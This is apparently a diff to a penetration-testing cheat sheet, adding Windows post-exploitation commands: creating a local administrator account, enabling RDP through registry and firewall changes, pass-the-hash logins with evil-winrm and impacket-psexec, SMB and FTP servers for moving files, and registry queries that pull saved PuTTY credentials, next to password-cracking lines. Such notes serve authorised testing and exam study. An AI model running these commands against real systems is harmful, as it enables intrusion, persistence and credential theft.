@@ -86,6 +86,36 @@ https://crackstation.net/
 `ssh2john sample.key > sample.hash`
 `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
 
+## Alternative to BURP
+Zed Attack Proxy  
+
+## Add local administrator
+`net user /add user P@ssw0rd!`
+`net localgroup administrators user /add`
+
+## Enable RDP
+`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
+`netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`
+
+## EvilWinRM
+`evil-winrm -i ip -u USER-H HASH -r DOMAIN` Sign in with a hash, try without domain as well
+using `download FILENAME` a file can be downloaded from the remote system. 
+
+## PSExec
+`impacket-psexec USER@ip -hashes :HASH`
+
+`python3 -m pyftpdlib -w -p 21`
+
+`impacket-smbserver -smb2support -username kali -password 1234 oscp oscp`
+
+## Get Putty credentials:
+`reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`
+`reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\`
+
+## GIT
+`wget -r` download folder over http  
+`git show HASH` to show changes in a specific commit  
+`git diff` to show all changes  
 ## Cracking ZIP
 `zip2john file.zip > zip.hash` Create hash file for zip archive  
 `| cut -d ':' -f 2` To make a zip2john file suitable for Hashcat  
@@ -101,6 +131,7 @@ done
 
 ## Get user and domain sid 
 `rpcclient lookupnames root/admin`
+
 
 ## Get scheduled taks info
 `schtasks /query /TN taskname /XML`
